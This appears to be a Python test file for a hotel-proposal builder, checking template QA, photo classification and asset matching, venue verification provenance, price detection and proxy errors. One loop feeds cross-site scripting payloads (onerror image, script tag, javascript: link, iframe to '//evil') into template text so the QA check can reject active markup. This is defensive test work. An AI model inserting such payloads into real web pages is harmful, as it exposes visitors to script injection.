r = QA.run(tpl=tpl, assets=imgs, **{**qa_in, "pvalid": {"critical": [{"code": "REQUIRED_FIELD_MISSING", "category": "REQUIRED_INFO_MISSING", "message": "address missing", "fields": ["address"], "level": 1}], "warnings": []}})
ok(r["outcome"] == "FAIL" and r["critical"][0]["fields"] == ["address"], "a critical profile error fails QA and names the field")
pl_bad = {**pl0, "sections": pl0["sections"][:-1]}
r = QA.run(tpl=tpl, assets=imgs, **{**qa_in, "plan": pl_bad})
ok(r["outcome"] == "FAIL", "a template that does not match the plan fails QA")
for bad, why in [("<img src=x onerror=alert(1)>", "an event-handler attribute"), ("<script>alert(1)</script>", "a script tag"), ('<a href="javascript:alert(1)">x</a>', "a javascript: link inside text"), ("<iframe src=//evil></iframe>", "a frame")]:
    tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += bad
    rx = QA.run(tpl=tx, assets=imgs, **qa_in)
    ok(rx["outcome"] == "FAIL" and any(x["code"] == "ACTIVE_MARKUP" for x in rx["critical"]), f"QA fails on {why} in any text")
tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += "<p>Seats &lt;img src=x onerror=alert(1)&gt; people</p>"
ok(QA.run(tpl=tx, assets=imgs, **qa_in)["outcome"] == "PASS", "the same text, HTML-escaped, is only wording and passes")

# --- found on a real hotel page (Hilton Dallas/Park Cities): text and photos the first version got wrong ---
ok(S2C.count_fact("Search 1 room, 1 guest Check in", r"(\d+\s+(?:guest\s+)?rooms?)") == "", "the booking form's '1 room, 1 guest' is not a fact about the hotel")
ok(S2C.count_fact("Rooms 2 rooms, 2 guests", r"(\d+\s+(?:guest\s+)?rooms?)") == "", "a changed booking form ('2 rooms, 2 guests') is still the form")
ok(S2C.count_fact("The hotel has 250 rooms and 12 suites.", r"(\d+\s+rooms?(?:\s+and\s+\d+\s+suites?)?)") == "250 rooms and 12 suites", "a real room count is kept")
ok(S2C.count_fact("1 restaurant", r"(\d+\s+restaurants?)") == "" and S2C.count_fact("3 restaurants and 2 bars", r"(\d+\s+restaurants?(?:\s+and\s+\d+\s+bars?)?)") == "3 restaurants and 2 bars", "a default count of 1 is not trusted; a real count is")
ok(S2C.count_fact("1 room, 1 guest. Our 120 rooms overlook the park", r"(\d+\s+rooms?)") == "120 rooms", "the form is skipped and the real statement later on the page is found")
cls = lambda alt: S2C.classify({"alt": alt, "url": "https://x.example/a.jpg", "w": 1600, "h": 900}, [])
ok(cls("King Guestroom with Bed and Lounge Area") == "rooms", "a guestroom photo is not filed under dining because its caption says 'lounge'")
ok(cls("Lobby Seating Area with Fireplace") == "exterior", "a lobby photo is not filed under guest rooms because its caption says 'seating area'")
ok(cls("Presidential Suite Living Area") == "rooms" and cls("Lobby Bar") == "dining" and cls("Wedding reception in the ballroom") == "meeting" and cls("Reception desk in the lobby") == "exterior", "the neighbouring cases still go where they should")
ok(cls("Pool") == "amenities" and cls("Woodbine Bar and Dining Area") == "dining" and cls("Suite Restaurant") == "dining", "a restaurant caption beats a room word")
ok(not any("GetYourGuide" in x for x in S2C.sentences("Save up to 15% off top attractions, events, and things to do through GetYourGuide when you book a stay at participating hotels.")), "a booking promotion is not a statement about the hotel")
ok(S2C.sentences("Our rooftop pool overlooks the park and the downtown skyline from the tenth floor.") != [], "ordinary sentences are kept")
for glued, why in [("Dallas Love Field4 milesAirport shuttleNot available", "words and numbers glued together"), ("1 restaurant.Our coffee bar opens at six", "a missing space after a full stop")]:
    tg = copy.deepcopy(tpl); tg["sections"][1]["components"][0]["data"]["text"] += "<p>" + glued + "</p>"
    rg = QA.run(tpl=tg, assets=imgs, **qa_in)
    ok(rg["outcome"] == "REVIEW" and any(x["code"] == "TEXT_RUN_TOGETHER" for x in rg["review"]), f"QA asks for a look when {why}")
tg = copy.deepcopy(tpl); tg["sections"][1]["components"][0]["data"]["text"] += "<p>Free WiFi and a DoubleTree welcome cookie, 24hr desk, from 3pm, Wi-Fi 6.</p>"
ok(QA.run(tpl=tg, assets=imgs, **qa_in)["outcome"] == "PASS", "ordinary wording (WiFi, 24hr, 3pm) is not mistaken for glued text")

# --- photos: export for upload to Hippo, and adopt what was uploaded ---
ok(PH.norm("Exterior_1.JPG") == PH.norm("exterior 1") == "exterior1" and PH.norm("exterior_10") != PH.norm("exterior_1"), "photo names match regardless of case, extension and separators, but exterior_10 is not exterior_1")
harvest = {"images": [{"section": "Why", "title": "exterior_1.jpg", "asset_id": 501, "token": "tokA"}, {"section": "Rooms", "title": "rooms_2", "asset_id": "502", "token": "tokB"},
                      {"section": "Rooms", "title": "banner copy", "asset_id": 503, "token": "tokC"}, {"section": "x", "title": "rooms_1", "asset_id": "abc", "token": "t"},
                      {"section": "x", "title": "exterior_1", "asset_id": 999, "token": "dup"}]}
pt, unm = PH.match_harvest(harvest, ["exterior_1", "rooms_1", "rooms_2", "dining_1"])
ok(pt == {"exterior_1": {"hippo": {"asset_id": 501, "token": "tokA", "title": "exterior_1.jpg"}}, "rooms_2": {"hippo": {"asset_id": 502, "token": "tokB", "title": "rooms_2"}}}, "uploaded assets are matched to photo keys by file name; the first match wins; a non-numeric id is refused")
ok(unm == ["banner copy"], "an uploaded image that is not a photo key is reported, not guessed at")
ok(PH.match_harvest("not a dict", ["a_1"]) == ({}, []) and PH.match_harvest({"images": [None, 3, {"title": "a_1"}]}, ["a_1"]) == ({}, []), "a malformed harvest file matches nothing instead of crashing")
hp_ = {"media": {"a_1": {"source_url": BASE + "/ok.png", "_alt": "Exterior at dusk"}, "a_2": {"source_url": BASE + "/gone.png"}, "a_3": {"source_url": BASE + "/same.png"}},
       "slots": {"fits": ["a_1"], "rooms": ["a_2", "a_1"], "gallery": ["a_3"]}}
tp_ = {"sections": [{"name": "Why", "components": [{"type": "Carousel", "data": {"assets": [{"type": "image", "url": BASE + "/ok.png", "merge_field": "Hotel Fits Image 1"}]}}]}]}
used = PH.used_photos(hp_, tp_)
ok([u[0] for u in used] == ["a_1", "a_2", "a_3"] and used[0][2] == ["Hotel Fits Image 1"], "each photo is listed once, in slot order, with the Hippo slot it fills")
PH._job = lambda d: (hp_, tp_)
outd = tempfile.mkdtemp()
_env = {k: os.environ.get(k) for k in ("ALLOW_HTTP", "ALLOW_PRIVATE_HOSTS")}; os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")      # the local image host is plain http on loopback
try: rc = PH.download(outd, os.path.join(outd, "p"))
finally:
    for k, v in _env.items(): os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
mf = json.load(open(os.path.join(outd, "p", "manifest.json")))
ok(rc == 0 and sorted(os.listdir(os.path.join(outd, "p"))) == ["a_1.png", "a_3.png", "manifest.json"] and [x["key"] for x in mf["failed"]] == ["a_2"], "photos are saved under their key; one that cannot be fetched is listed, not fatal")
ok(mf["photos"][0]["merge_fields"] == ["Hotel Fits Image 1"] and mf["photos"][0]["caption"] == "Exterior at dusk", "the manifest says which Hippo slot and caption each file belongs to")
hh_up = copy.deepcopy(H); k0 = hh_up["slots"]["gallery"][0]; src0 = hh_up["media"][k0]["source_url"]
hh_up["media"][k0]["hippo"] = {"asset_id": 77, "token": "tokZ", "title": k0}
tpl_up = B.build_full(hh_up, pl0)[0]
ok("video/thumbnail/tokZ" in json.dumps(tpl_up) and src0 not in json.dumps(tpl_up), "a photo uploaded to Hippo is used everywhere, including the hero, from Hippo's copy: the hotel site's original is not left behind unchecked")
tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += "<p>" + "1," * 60000 + " USD</p>"
t0 = _t.time(); QA.run(tpl=tx, assets=imgs, **qa_in)
ok(_t.time() - t0 < 3, "pathological hotel text cannot stall the QA regexes")
t6 = copy.deepcopy(tpl); t6["sections"][2]["components"][0]["data"]["text"] = "<p> </p>"
ok(QA.run(tpl=t6, assets=imgs, **qa_in)["outcome"] == "FAIL", "a blank required text block fails QA")

# ------------------------------------------------------------------ findings from the correctness review
print("review findings")
ids = {u: HP.hotel_identity(u) for u in ["https://www.ihg.com/crowneplaza/hotels/us/en/new-york/nycxx/hoteldetail", "https://www.ihg.com/crowneplaza/hotels/us/en/atlanta/atlxx/hoteldetail",
                                         "https://hotelchain.com/ny/grand-hotel", "https://hotelchain.com/la/grand-hotel", "https://hotelchain.com/en/grand-hotel", "https://hotelchain.com/grand-hotel"]}
u = list(ids)
ok(len({ids[x]["hotel_id"] for x in u[:4]}) == 4, "different hotels never share an id: city hotel codes and state codes count, only real locale segments are ignored")
ok(ids[u[4]]["hotel_id"] == ids[u[5]]["hotel_id"], "a language segment (en) is still ignored")
ok(ids[u[0]]["official_path"] == "/crowneplaza/hotels/us/en/new-york/nycxx", "the official URL is the hotel's own page, not a shared country prefix")

fx = [{"field": "venue", "value": "Ballroom | 300 sq m | 200", "source_url": "https://x.example/meetings", "quote": "", "verified": True},
      {"field": "room_type", "value": "Deluxe King | 30 sq m | 2", "source_url": "https://x.example/rooms", "quote": "", "verified": True},
      {"field": "room_type", "value": "Garden Suite | 55 sq m | 4", "source_url": "https://x.example/rooms", "quote": "", "verified": True}]
def prof_for(h, ov=None):
    return HP.build_profile(hotel=HP.hotel_identity("https://x.example/hotels/demo"), inp={"hotel_url": "https://x.example/hotels/demo"}, h=h, cfg={"sources": []}, facts=fx, cp={}, ov=ov or {}, custom={}, scrape={}, plan_branding=None)
vh = {**H, "venues": {"columns": ["Venue", "Area", "Theatre"], "rows": [["Ballroom", "300 sq m", "200"]]}, "room_types": {"columns": ["Room type", "Size", "Guests"], "rows": [["Deluxe King", "30 sq m", "2"], ["Garden Suite", "55 sq m", "4"]]}}
pv0 = prof_for(vh)
ok([v["verification_status"] for v in pv0["venues"]] == ["officially_verified"] and next(e for e in pv0["evidence"] if e["field_key"] == "venues")["provenance"] == "officially_verified", "unchanged venues stay officially verified, with the page as their source")
moon = {**vh, "venues": {**vh["venues"], "rows": vh["venues"]["rows"] + [["Moon Base Alpha", "10,000 sq m", "5000"]]}}
pv1 = prof_for(moon, {"venues": moon["venues"]})
ok([v["verification_status"] for v in pv1["venues"]] == ["officially_verified", "manually_corrected"] and pv1["venues"][1]["source_url"] is None, "a venue a reviewer added is manually corrected with no page behind it; the untouched one is still verified")
ev = next(e for e in pv1["evidence"] if e["field_key"] == "venues")
ok(ev["provenance"] == "manually_corrected" and ev["extraction_method"] == "reviewer_override", "and the venues evidence says a person changed it")
edited = {**vh, "venues": {**vh["venues"], "rows": [["Ballroom", "300 sq m", "900"]]}}
ok(prof_for(edited, {"venues": edited["venues"]})["venues"][0]["verification_status"] == "manually_corrected", "same venue, different capacity than the page: manual, not verified")
flip = {**vh, "room_types": {**vh["room_types"], "rows": list(reversed(vh["room_types"]["rows"]))}}
ok([r["verification_status"] for r in prof_for(flip)["rooms"]] == ["officially_verified", "officially_verified"] and [r["room_name"] for r in prof_for(flip)["rooms"]] == ["Garden Suite", "Deluxe King"], "reordered rooms keep their own verification (matched by name, not position)")
ev_k = {"override.venues": 1}
mp = MP.build_mapping(moon, pl0, {**pv1, "assets": []}, tpl, "email", [{"section": "meeting", "slot": "venue table", "config_key": "venues", "detail": None, "required": False}], None)
ok(mp["static"][0]["provenance"] == "manually_corrected" and mp["static"][0]["source_field"] == "override.venues", "the mapping report shows the reviewer's venues as manual, not verified")

for t in ["Rooms start at INR 8,000 a night", "USD 150", "Rs. 5,000 per room", "from 120 a night", "€250", "AED 800", "8,000 INR", "$99", "nightly rate"]:
    ok(bool(QA.MONEY.search(t)), f"price recognised: {t}")
for t in ["Spend a night in the palace", "214 rooms and 3,200 sqm of event space", "up to 500 guests", "Check-in from 3:00 pm", "Open 24 hours a day"]:
    ok(not QA.MONEY.search(t), f"ordinary wording is not a price: {t}")
txm = copy.deepcopy(tpl); txm["sections"][1]["components"][0]["data"]["text"] += "<p>Rooms start at INR 8,000 a night for corporate groups</p>"
rm = QA.run(tpl=txm, assets=imgs, **qa_in)
ok(rm["outcome"] == "REVIEW" and any(x["category"] == "COMMERCIAL_APPROVAL" for x in rm["review"]), "a price written code-first is caught (it used to pass)")

ch = [{"kind": "substituted", "key": "rooms", "transient": False, "note": "slot 'rooms' had no working photo: using amenities_1, a different photo"}]
r1 = QA.run(tpl=tpl, assets=imgs, asset_changes=ch, **qa_in)
ok(r1["outcome"] == "REVIEW" and any(x["code"] == "PHOTOS_CHANGED" for x in r1["review"]), "a photo from another category standing in for a missing one needs a person")
ok(QA.run(tpl=tpl, assets=imgs, asset_changes=[{"kind": "removed", "key": "x", "transient": False, "note": "x removed: HTTP 404"}], **qa_in)["outcome"] == "PASS", "an extra photo that is permanently gone is just noted")
ok(QA.run(tpl=tpl, assets=imgs, asset_changes=[{"kind": "removed", "key": "x", "transient": True, "note": "x removed: timeout"}], **qa_in)["outcome"] == "REVIEW", "a photo dropped over a temporary error is not silently lost")
ok(QA.run(tpl=tpl, assets=imgs, rights_approved=True, **{**qa_in, "profile": prof2})["outcome"] == "PASS", "rights approved for this job (request or reviewer layer) satisfy QA without touching the stored profile")
ach = []
hx = {"media": {"a_1": {"source_url": BASE + "/gone.png"}, "a_2": {"source_url": BASE + "/ok.png"}, "u_1": {"source_url": BASE + "/ok2.png"}}, "slots": {"rooms": ["a_1"], "gallery": ["a_2"]}}
os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")
AS.prune_media(hx, {BASE + "/gone.png": {"ok": False, "error": "HTTP 404", "transient": False}, BASE + "/ok.png": {"ok": True, "sha256": "aa"}}, "enforce", ach)
ok([c["kind"] for c in ach] == ["removed", "substituted"] and ach[1]["key"] == "rooms", "prune_media reports each removal and substitution for QA")
os.environ.pop("ALLOW_HTTP"); os.environ.pop("ALLOW_PRIVATE_HOSTS")
import urllib.error as _ue
_real_open = N._opener.open
N._opener.open = lambda *a, **k: (_ for _ in ()).throw(_ue.URLError(OSError("Tunnel connection failed: 403 Forbidden")))
os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")
ok(raises(N.Unsafe, lambda: N.fetch("http://127.0.0.1:1/x.png")), "a proxy that answers 403 is a refusal, not a temporary error")
N._opener.open = lambda *a, **k: (_ for _ in ()).throw(_ue.URLError(OSError("Tunnel connection failed: 503 Service Unavailable")))
ok(raises(N.Transient, lambda: N.fetch("http://127.0.0.1:1/x.png")), "but a proxy 503 is worth retrying")
N._opener.open = _real_open
os.environ.pop("ALLOW_HTTP"); os.environ.pop("ALLOW_PRIVATE_HOSTS")

p = plan({"focus": "meetings"}, profile={**HOTEL, "venues": []})
ok(p["template_family"] == "corporate_event" and p["unmet_requests"] and "venue" in p["unmet_requests"][0]["reason"], "a focus the hotel cannot support is reported, not quietly downgraded")
ok("meeting" in plan({"focus": "event"})["required_sections"] and "meeting" not in plan({})["required_sections"], "meeting space is a required section for event-focused proposals only")
p = plan({"focus": "event", "rfp_needs": {"meeting": False}})
ok(p["blocking"] and p["blocking"][0]["code"] == "REQUIRED_SECTION_DROPPED" and "meeting" in keys(p), "an RFP that drops the required meeting section is a blocker, stated at planning time")
ok(CU.validate_customization({"focus": "event", "exclude_sections": ["meeting"]})[1] and CU.validate_customization({"template_family": "meeting_space", "exclude_sections": ["meeting"]})[1], "excluding meeting space from an event proposal is rejected up front")
ok(not CU.validate_customization({"focus": "rooms", "exclude_sections": ["meeting"]})[1], "while it stays fine for a rooms-focused one")
p = plan({}, cp={"left_out": ["dining_intro", "location_cards.parking"]})
ok(p["left_out"] == ["dining_intro", "location_cards.parking"] and any("left out" in d for d in p["decisions"]), "blocks with nothing sourced are listed as left out")

st2 = HP.Store(tempfile.mkdtemp())
for h_, v_ in (("demo-hotel-12345678", "a"), ("demo-hotel-12345678", "b")): st2.save({**prof(hash=v_), "hotel_id": h_})
st2.approve("demo-hotel-12345678", 2, "x"); st2.approve("demo-hotel-12345678", 1, "y")
ok(st2.index("demo-hotel-12345678")["approved_version"] == 2, "approving an older version never un-approves a newer one")

print(f"\n{passed} engine checks passed")
srv.shutdown()
